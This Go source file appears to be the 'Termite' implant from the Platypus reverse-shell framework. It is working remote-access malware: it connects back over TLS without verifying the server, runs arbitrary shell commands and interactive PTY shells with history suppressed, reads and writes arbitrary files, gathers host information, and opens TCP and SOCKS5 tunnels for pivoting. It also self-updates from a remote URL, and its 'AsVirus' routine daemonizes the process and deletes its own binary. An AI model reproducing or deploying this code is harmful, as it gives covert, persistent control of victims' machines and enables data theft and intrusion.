package main

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/gob"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/WangYihang/Platypus/lib/util/crypto"
	"github.com/WangYihang/Platypus/lib/util/hash"
	"github.com/WangYihang/Platypus/lib/util/log"
	"github.com/WangYihang/Platypus/lib/util/message"
	"github.com/WangYihang/Platypus/lib/util/str"
	"github.com/WangYihang/Platypus/lib/util/update"
	"github.com/armon/go-socks5"
	"github.com/creack/pty"
	"github.com/phayes/freeport"
	"github.com/rhysd/go-github-selfupdate/selfupdate"
	"github.com/sevlyar/go-daemon"
)

type Backoff struct {
	Current int64
	Unit    time.Duration
	Max     int64
}

func (b *Backoff) Reset() {
	b.Current = 1
}

func (b *Backoff) increase() {
	b.Current <<= 1
	if b.Current > b.Max {
		b.Reset()
	}
}

func (b *Backoff) Sleep(add int64) {
	var i int64 = 0
	for i < b.Current+add {
		time.Sleep(b.Unit)
		i++
	}
	b.increase()
}

func CreateBackOff() *Backoff {
	backoff := &Backoff{
		Unit: time.Second,
		Max:  0x100,
	}
	backoff.Reset()
	return backoff
}

var backoff *Backoff

type TermiteProcess struct {
	ptmx       *os.File
	windowSize *pty.Winsize
	process    *exec.Cmd
}

var processes map[string]*TermiteProcess
var pullTunnels map[string]*net.Conn
var pushTunnels map[string]*net.Conn
var socks5ServerListener *net.Listener

type Client struct {
	Conn        *tls.Conn
	Encoder     *gob.Encoder
	Decoder     *gob.Decoder
	EncoderLock *sync.Mutex
	DecoderLock *sync.Mutex
	Service     string
}

func handleConnection(c *Client) {
	oldBackoffCurrent := backoff.Current

	for {
		msg := &message.Message{}
		c.DecoderLock.Lock()
		err := c.Decoder.Decode(msg)
		c.DecoderLock.Unlock()
		if err != nil {
			// Network
			log.Error("Network error: %s", err)
			break
		}
		backoff.Reset()
		switch msg.Type {
		case message.STDIO:
			if termiteProcess, exists := processes[msg.Body.(*message.BodyStdio).Key]; exists {
				termiteProcess.ptmx.Write(msg.Body.(*message.BodyStdio).Data)
			}
		case message.WINDOW_SIZE:
			serverWindowSize := &pty.Winsize{
				Cols: uint16(msg.Body.(*message.BodyWindowSize).Columns),
				Rows: uint16(msg.Body.(*message.BodyWindowSize).Rows),
				X:    0,
				Y:    0,
			}
			// Change pty window size
			if termiteProcess, exists := processes[msg.Body.(*message.BodyWindowSize).Key]; exists {
				pty.Setsize(termiteProcess.ptmx, serverWindowSize)
			}
		case message.PROCESS_START:
			bodyStartProcess := msg.Body.(*message.BodyStartProcess)
			if bodyStartProcess.Path == "" {
				continue
			}
			log.Success("Starting process: %s", bodyStartProcess.Path)
			process := exec.Command(bodyStartProcess.Path)

			// Disable command history
			process.Env = os.Environ()
			process.Env = append(process.Env, "HISTORY=")
			process.Env = append(process.Env, "HISTSIZE=0")
			process.Env = append(process.Env, "HISTSAVE=")
			process.Env = append(process.Env, "HISTZONE=")
			process.Env = append(process.Env, "HISTLOG=")
			process.Env = append(process.Env, "HISTFILE=")
			process.Env = append(process.Env, "HISTFILE=/dev/null")
			process.Env = append(process.Env, "HISTFILESIZE=0")

			windowSize := pty.Winsize{
				uint16(bodyStartProcess.WindowRows),
				uint16(bodyStartProcess.WindowColumns),
				0,
				0,
			}
			ptmx, _ := pty.StartWithSize(process, &windowSize)
			processes[bodyStartProcess.Key] = &TermiteProcess{
				windowSize: &windowSize,
				ptmx:       ptmx,
				process:    process,
			}
			log.Success("Process started: %d", process.Process.Pid)
			log.Success("Process added: %v", processes)
			defer func() { _ = ptmx.Close() }()

			c.EncoderLock.Lock()
			err = c.Encoder.Encode(message.Message{
				Type: message.PROCESS_STARTED,
				Body: message.BodyProcessStarted{
					Key: bodyStartProcess.Key,
					Pid: process.Process.Pid,
				},
			})
			c.EncoderLock.Unlock()
			if err != nil {
				// Network
				log.Error("Network error: %s", err)
				break
			}

			go func() {
				for {
					buffer := make([]byte, 0x4000)
					n, err := ptmx.Read(buffer)
					if err != nil {
						if err == io.EOF {
							c.EncoderLock.Lock()
							err = c.Encoder.Encode(message.Message{
								Type: message.PROCESS_STOPED,
								Body: message.BodyProcessStoped{
									Key:  bodyStartProcess.Key,
									Code: 0,
								},
							})
							c.EncoderLock.Unlock()
							if err != nil {
								// Network
								fmt.Println("Process stoped: %v", err)
								break
							}
							break
						}
						break
					}
					if n > 0 {
						c.EncoderLock.Lock()
						err = c.Encoder.Encode(message.Message{
							Type: message.STDIO,
							Body: message.BodyStdio{
								Key:  bodyStartProcess.Key,
								Data: buffer[0:n],
							},
						})
						c.EncoderLock.Unlock()
						if err != nil {
							// Network
							log.Error("Network error: %s", err)
							break
						}
					}
				}
			}()

			// Wait process exit
			go func() {
				err := process.Wait()

				exitCode := 0
				if err != nil {
					exitCode = err.(*exec.ExitError).ExitCode()
				}
				fmt.Println("Exit code: ", exitCode)

				c.EncoderLock.Lock()
				err = c.Encoder.Encode(message.Message{
					Type: message.PROCESS_STOPED,
					Body: message.BodyProcessStoped{
						Key:  bodyStartProcess.Key,
						Code: exitCode,
					},
				})
				c.EncoderLock.Unlock()

				if err != nil {
					// Network
					log.Error("Network error: %s", err)
				}

				delete(processes, bodyStartProcess.Key)
			}()
		case message.PROCESS_STARTED:
		case message.PROCESS_STOPED:
		case message.GET_CLIENT_INFO:
			// User Information
			userInfo, err := user.Current()
			var username string
			if err != nil {
				username = "Unknown"
			} else {
				username = userInfo.Username
			}
			// Python
			python2, err := exec.LookPath("python2")
			if err != nil {
				python2 = ""
			}

			python3, err := exec.LookPath("python3")
			if err != nil {
				python3 = ""
			}

			// Network interfaces
			interfaces := map[string]string{}
			ifaces, _ := net.Interfaces()
			for _, i := range ifaces {
				interfaces[i.Name] = i.HardwareAddr.String()
			}

			c.EncoderLock.Lock()
			err = c.Encoder.Encode(message.Message{
				Type: message.CLIENT_INFO,
				Body: message.BodyClientInfo{
					Version:           update.Version,
					User:              username,
					OS:                runtime.GOOS,
					Python2:           python2,
					Python3:           python3,
					NetworkInterfaces: interfaces,
				},
			})
			c.EncoderLock.Unlock()

			if err != nil {
				// Network
				log.Error("Network error: %s", err)
				return
			}
		case message.DUPLICATED_CLIENT:
			backoff.Current = oldBackoffCurrent
			log.Error("Duplicated connection")
			os.Exit(0)
		case message.PROCESS_TERMINATE:
			key := msg.Body.(*message.BodyTerminateProcess).Key
			log.Success("Request terminate %s", key)
			if termiteProcess, exists := processes[key]; exists {
				syscall.Kill(termiteProcess.process.Process.Pid, syscall.SIGTERM)
				termiteProcess.ptmx.Close()
			}
		case message.PULL_TUNNEL_CONNECT:
			address := msg.Body.(*message.BodyPullTunnelConnect).Address
			token := msg.Body.(*message.BodyPullTunnelConnect).Token

			conn, err := net.Dial("tcp", address)
			if err != nil {
				log.Error(err.Error())
				c.EncoderLock.Lock()
				c.Encoder.Encode(message.Message{
					Type: message.PULL_TUNNEL_CONNECT_FAILED,
					Body: message.BodyPullTunnelConnectFailed{
						Token:  token,
						Reason: err.Error(),
					},
				})
				c.EncoderLock.Unlock()
			} else {
				c.EncoderLock.Lock()
				err := c.Encoder.Encode(message.Message{
					Type: message.PULL_TUNNEL_CONNECTED,
					Body: message.BodyPullTunnelConnected{
						Token: token,
					},
				})
				c.EncoderLock.Unlock()

				if err != nil {
					log.Error(err.Error())
				} else {
					pullTunnels[token] = &conn
					go func() {
						for {
							buffer := make([]byte, 0x100)
							n, err := conn.Read(buffer)
							if err != nil {
								log.Success("Tunnel (%s) disconnected: %s", token, err.Error())
								c.EncoderLock.Lock()
								c.Encoder.Encode(message.Message{
									Type: message.PULL_TUNNEL_DISCONNECTED,
									Body: message.BodyPullTunnelDisconnected{
										Token: token,
									},
								})
								c.EncoderLock.Unlock()
								conn.Close()
								break
							} else {
								if n > 0 {
									c.EncoderLock.Lock()
									c.Encoder.Encode(message.Message{
										Type: message.PULL_TUNNEL_DATA,
										Body: message.BodyPullTunnelData{
											Token: token,
											Data:  buffer[0:n],
										},
									})
									c.EncoderLock.Unlock()
								}
							}
						}
					}()
				}
			}
		case message.PULL_TUNNEL_DATA:
			token := msg.Body.(*message.BodyPullTunnelData).Token
			data := msg.Body.(*message.BodyPullTunnelData).Data
			if conn, exists := pullTunnels[token]; exists {
				_, err := (*conn).Write(data)
				if err != nil {
					(*conn).Close()
				}
			} else {
				log.Debug("No such tunnel: %s", token)
			}
		case message.PULL_TUNNEL_DISCONNECT:
			token := msg.Body.(*message.BodyPullTunnelDisconnect).Token
			if conn, exists := pullTunnels[token]; exists {
				log.Info("Closing conntion: %s", (*conn).RemoteAddr().String())
				(*conn).Close()
				delete(pullTunnels, token)
				c.EncoderLock.Lock()
				c.Encoder.Encode(message.Message{
					Type: message.PULL_TUNNEL_DISCONNECTED,
					Body: message.BodyPullTunnelDisconnected{
						Token: token,
					},
				})
				c.EncoderLock.Unlock()
			} else {
				log.Debug("No such tunnel: %s", token)
			}
		case message.PUSH_TUNNEL_CREATE:
			address := msg.Body.(*message.BodyPushTunnelCreate).Address
			log.Info("Creating remote port forwarding from %s", address)
			server, err := net.Listen("tcp", address)
			if err != nil {
				log.Error("Server (%s) create failed: %s", address, err.Error())
				c.EncoderLock.Lock()
				c.Encoder.Encode(message.Message{
					Type: message.PUSH_TUNNEL_CREATE_FAILED,
					Body: message.BodyPushTunnelCreateFailed{
						Address: address,
						Reason:  err.Error(),
					},
				})
				c.EncoderLock.Unlock()
			} else {
				log.Success("Server created (%s)", address)
				c.EncoderLock.Lock()
				c.Encoder.Encode(message.Message{
					Type: message.PUSH_TUNNEL_CREATED,
					Body: message.BodyPushTunnelCreated{
						Address: address,
					},
				})
				c.EncoderLock.Unlock()

				go func() {
					for {
						conn, err := server.Accept()
						token := str.RandomString(0x10)
						log.Success("Connection came from: %s", conn.RemoteAddr().String())
						if err == nil {
							c.EncoderLock.Lock()
							c.Encoder.Encode(message.Message{
								Type: message.PUSH_TUNNEL_CONNECT,
								Body: message.BodyPushTunnelConnect{
									Token:   token,
									Address: address,
								},
							})
							c.EncoderLock.Unlock()
							pushTunnels[token] = &conn
						}
					}
				}()
			}
		case message.PUSH_TUNNEL_CONNECTED:
			token := msg.Body.(*message.BodyPushTunnelConnected).Token
			log.Success("Connection (%s) connected", token)
			if conn, exists := pushTunnels[token]; exists {
				go func() {
					for {
						buffer := make([]byte, 0x4000)
						n, err := (*conn).Read(buffer)
						if err != nil {
							log.Error("Read from (%s) failed: %s", token, err.Error())
							c.EncoderLock.Lock()
							c.Encoder.Encode(message.Message{
								Type: message.PUSH_TUNNEL_DISCONNECTED,
								Body: message.BodyPushTunnelDisonnected{
									Token:  token,
									Reason: err.Error(),
								},
							})
							c.EncoderLock.Unlock()
							(*conn).Close()
							delete(pushTunnels, token)
							break
						} else {
							log.Debug("%d bytes read from (%s)", n, token)
							c.EncoderLock.Lock()
							c.Encoder.Encode(message.Message{
								Type: message.PUSH_TUNNEL_DATA,
								Body: message.BodyPushTunnelData{
									Token: token,
									Data:  buffer[0:n],
								},
							})
							c.EncoderLock.Unlock()
						}
					}
				}()
			} else {
				log.Debug("No such tunnel (PUSH_TUNNEL_CONNECTED): %s", token)
			}
		case message.PUSH_TUNNEL_DISCONNECTED:
			token := msg.Body.(*message.BodyPushTunnelDisonnected).Token
			if conn, exists := pushTunnels[token]; exists {
				(*conn).Close()
				delete(pushTunnels, token)
			} else {
				log.Debug("No such tunnel (PUSH_TUNNEL_DISCONNECTED): %s", token)
			}
		case message.PUSH_TUNNEL_CONNECT_FAILED:
			token := msg.Body.(*message.BodyPushTunnelConnectFailed).Token
			if conn, exists := pushTunnels[token]; exists {
				(*conn).Close()
				delete(pushTunnels, token)
			} else {
				log.Debug("No such tunnel (PUSH_TUNNEL_CONNECT_FAILED): %s", token)
			}
		case message.PUSH_TUNNEL_DATA:
			token := msg.Body.(*message.BodyPushTunnelData).Token
			data := msg.Body.(*message.BodyPushTunnelData).Data
			if conn, exists := pushTunnels[token]; exists {
				_, err := (*conn).Write(data)
				if err != nil {
					(*conn).Close()
					delete(pushTunnels, token)
				}
			} else {
				log.Debug("No such tunnel (PUSH_TUNNEL_DATA): %s", token)
			}
		case message.DYNAMIC_TUNNEL_CREATE:
			port, err := StartSocks5Server()
			if err != nil {
				c.EncoderLock.Lock()
				c.Encoder.Encode(message.Message{
					Type: message.DYNAMIC_TUNNEL_CREATE_FAILED,
					Body: message.BodyDynamicTunnelCreateFailed{
						Reason: err.Error(),
					},
				})
				c.EncoderLock.Unlock()
			} else {
				c.EncoderLock.Lock()
				c.Encoder.Encode(message.Message{
					Type: message.DYNAMIC_TUNNEL_CREATED,
					Body: message.BodyDynamicTunnelCreated{
						Port: port,
					},
				})
				c.EncoderLock.Unlock()
			}
		case message.DYNAMIC_TUNNEL_DESTROY:
			err := StopSocks5Server()
			if err != nil {
				log.Error("StopSocks5Server() failed: %s", err.Error())
				c.EncoderLock.Lock()
				c.Encoder.Encode(message.Message{
					Type: message.DYNAMIC_TUNNEL_DESTROY_FAILED,
					Body: message.BodyDynamicTunnelDestroyFailed{
						Reason: err.Error(),
					},
				})
				c.EncoderLock.Unlock()
			} else {
				c.EncoderLock.Lock()
				c.Encoder.Encode(message.Message{
					Type: message.DYNAMIC_TUNNEL_DESTROIED,
					Body: message.BodyDynamicTunnelDestroied{},
				})
				c.EncoderLock.Unlock()
				socks5ServerListener = nil
			}
		case message.CALL_SYSTEM:
			token := msg.Body.(*message.BodyCallSystem).Token
			command := msg.Body.(*message.BodyCallSystem).Command
			result, err := exec.Command("sh", "-c", command).Output()
			if err != nil {
				result = []byte("")
			}
			c.EncoderLock.Lock()
			c.Encoder.Encode(message.Message{
				Type: message.CALL_SYSTEM_RESULT,
				Body: message.BodyCallSystemResult{
					Token:  token,
					Result: result,
				},
			})
			c.EncoderLock.Unlock()
		case message.READ_FILE:
			token := msg.Body.(*message.BodyReadFile).Token
			path := msg.Body.(*message.BodyReadFile).Path
			content, err := ioutil.ReadFile(path)
			if err != nil {
				content = []byte("")
			}
			c.EncoderLock.Lock()
			c.Encoder.Encode(message.Message{
				Type: message.READ_FILE_RESULT,
				Body: message.BodyReadFileResult{
					Token:  token,
					Result: content,
				},
			})
			c.EncoderLock.Unlock()
		case message.WRITE_FILE:
			token := msg.Body.(*message.BodyWriteFile).Token
			path := msg.Body.(*message.BodyWriteFile).Path
			content := msg.Body.(*message.BodyWriteFile).Content
			err := ioutil.WriteFile(path, content, 0644)
			n := len(content)
			if err != nil {
				n = -1
			}
			c.EncoderLock.Lock()
			c.Encoder.Encode(message.Message{
				Type: message.WRITE_FILE_RESULT,
				Body: message.BodyWriteFileResult{
					Token: token,
					N:     n,
				},
			})
			c.EncoderLock.Unlock()
		case message.UPDATE:
			file, _ := ioutil.TempFile(os.TempDir(), "temp")
			exe := file.Name()
			log.Info("New filename: %s", exe)
			distributorUrl := msg.Body.(*message.BodyUpdate).DistributorUrl
			version := msg.Body.(*message.BodyUpdate).Version
			log.Info("New version v%s is available, upgrading...", version)
			url := fmt.Sprintf("%s/termite/%s", distributorUrl, c.Service)
			if err := selfupdate.UpdateTo(url, exe); err != nil {
				log.Error("Error occurred while updating binary: %s", err)
				return
			}
			log.Info("Update to v%s finished", version)
			log.Info("Restarting...")
			syscall.Exec(exe, []string{exe}, nil)
		}
	}
}

func StartSocks5Server() (int, error) {
	// Generate random port
	port, err := freeport.GetFreePort()
	if err != nil {
		return -1, err
	}
	log.Success("Port: %d", port)
	addr := fmt.Sprintf("127.0.0.1:%d", port)
	// Create tcp listener
	socks5ServerListener, err := net.Listen("tcp", addr)
	if err != nil {
		return -1, err
	}
	// Create socks5 server
	server, err := socks5.New(&socks5.Config{})
	if err != nil {
		return -1, err
	}
	// Start socks5 server
	go server.Serve(socks5ServerListener)
	log.Success("Socks server started at: %s", addr)
	return port, nil
}

func StopSocks5Server() error {
	return (*socks5ServerListener).Close()
}

func StartClient(service string) bool {
	needRetry := true
	certBuilder := new(strings.Builder)
	keyBuilder := new(strings.Builder)
	crypto.Generate(certBuilder, keyBuilder)

	pemContent := []byte(fmt.Sprint(certBuilder))
	keyContent := []byte(fmt.Sprint(keyBuilder))

	cert, err := tls.X509KeyPair(pemContent, keyContent)
	if err != nil {
		log.Error("server: loadkeys: %s", err)
		return needRetry
	}

	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	if hash.MD5(service) != "4d1bf9fd5962f16f6b4b53a387a6d852" {
		log.Debug("Connecting to: %s", service)
		conn, err := tls.Dial("tcp", service, &config)
		if err != nil {
			log.Error("client: dial: %s", err)
			return needRetry
		}
		defer conn.Close()

		state := conn.ConnectionState()
		for _, v := range state.PeerCertificates {
			x509.MarshalPKIXPublicKey(v.PublicKey)
		}

		log.Debug("client: handshake: %s", state.HandshakeComplete)
		log.Debug("client: mutual: %s", state.NegotiatedProtocolIsMutual)
		log.Success("Secure connection established on %s", conn.RemoteAddr())

		c := &Client{
			Conn:        conn,
			Encoder:     gob.NewEncoder(conn),
			Decoder:     gob.NewDecoder(conn),
			EncoderLock: &sync.Mutex{},
			DecoderLock: &sync.Mutex{},
			Service:     service,
		}
		handleConnection(c)
		return needRetry
	} else {
		return !needRetry
	}
}

func RemoveSelfExecutable() {
	filename, _ := filepath.Abs(os.Args[0])
	os.Remove(filename)
}

func AsVirus() {
	cntxt := &daemon.Context{
		WorkDir: "/",
		Umask:   027,
		Args:    []string{},
	}

	d, err := cntxt.Reborn()
	if err != nil {
		log.Error("Unable to run: ", err)
	}
	if d != nil {
		return
	}
	defer cntxt.Release()
	log.Success("daemon started")

	RemoveSelfExecutable()
}

func main() {
	message.RegisterGob()
	backoff = CreateBackOff()
	processes = map[string]*TermiteProcess{}
	pullTunnels = map[string]*net.Conn{}
	pushTunnels = map[string]*net.Conn{}
	service := "127.0.0.1:13337"
	release := true

	if release {
		service = strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
	}

	for {
		log.Info("Termite (v%s) starting...", update.Version)
		if StartClient(service) {
			if release {
				AsVirus()
			}
			add := (int64(rand.Uint64()) % backoff.Current)
			log.Error("Connect to server failed, sleeping for %d seconds", backoff.Current+add)
			backoff.Sleep(add)
		} else {
			break
		}
	}
}
